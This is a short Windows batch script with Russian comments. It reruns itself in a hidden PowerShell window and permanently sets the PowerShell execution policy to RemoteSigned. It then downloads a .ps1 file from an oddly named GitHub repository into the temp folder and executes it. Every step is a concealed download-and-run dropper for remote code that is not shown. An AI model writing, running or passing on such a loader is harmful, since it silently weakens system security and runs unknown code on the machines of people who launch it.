@echo off
:: Проверяем, запущен ли скрипт через PowerShell (скрытый режим)
if "%1" == "hidden" goto run

:: Запускаем себя через PowerShell в скрытом режиме
powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
exit /b

:run
:: Включаем выполнение сценариев PowerShell (RemoteSigned - навсегда)
powershell -NoProfile -Command "Set-ExecutionPolicy RemoteSigned -Force"

:: Загружаем .ps1 файл с GitHub
powershell -NoProfile -Command "iwr 'https://raw.githubusercontent.com/cqdll/-/main/a.ps1' -OutFile \"%TEMP%\a.ps1\" -UseBasicParsing"

:: Запускаем загруженный .ps1 файл
powershell -NoProfile -File "%TEMP%\a.ps1"
